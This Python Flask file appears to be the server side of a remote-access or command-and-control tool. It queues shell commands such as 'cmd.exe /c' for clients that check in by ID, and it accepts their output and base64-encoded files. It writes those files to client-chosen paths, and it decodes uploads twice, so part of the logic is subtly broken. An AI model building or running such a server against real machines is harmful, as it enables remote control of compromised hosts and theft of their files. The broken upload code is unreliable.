from flask import Flask, request, Response
import json
import base64

app = Flask(__name__)

commands = {}

def get_next_command(client_id):
    if client_id in commands and commands[client_id]:
        return commands[client_id].pop(0)
    return None

def handle_file_upload(file_content, file_path):
    with open(file_path, 'wb') as f:
        f.write(base64.b64decode(file_content))

@app.route('/checkin', methods=['GET'])
def checkin():
    client_id = request.args.get('ID')
    print(f"Check-in request from: {client_id}")
    if client_id:
        command = get_next_command(client_id)
        if command:
            print(f"Sending command to {client_id}: {command}")
            return json.dumps(command)
        else:
            return json.dumps({"command": "no_command"})
    return "invalid_request", 400

@app.route('/report', methods=['POST'])
def report():
    client_id = request.args.get('ID')
    if client_id:
        try:
            report_data = json.loads(request.data)
            if report_data["type"] == "execute_result":
                print(f"Client {client_id} reported execute result: {report_data['data']}")
            elif report_data["type"] == "download":
                file_path = report_data["file_path"]
                file_content_b64 = report_data["file_content"]
                file_content = base64.b64decode(file_content_b64)
                handle_file_upload(file_content, file_path)
                print(f"Received file from client {client_id}: {file_path}")
            else:
                print(f"Unknown report type from client {client_id}: {report_data}")
            return "OK"
        except json.decoder.JSONDecodeError:
            return "Invalid JSON", 400
    return "invalid_request", 400

def add_command(client_id, command):
    if client_id not in commands:
        commands[client_id] = []
    commands[client_id].append(command)

if __name__ == '__main__':
    add_command('123', {"command": "execute", "args": "cmd.exe /c dir"})
    with open('sample.txt', 'rb') as f:
        file_content = base64.b64encode(f.read()).decode()
    add_command('DESKTOP-ID', {"command": "execute", "args": "cmd.exe /c echo Hello"})

    app.run(host='0.0.0.0', port=8080)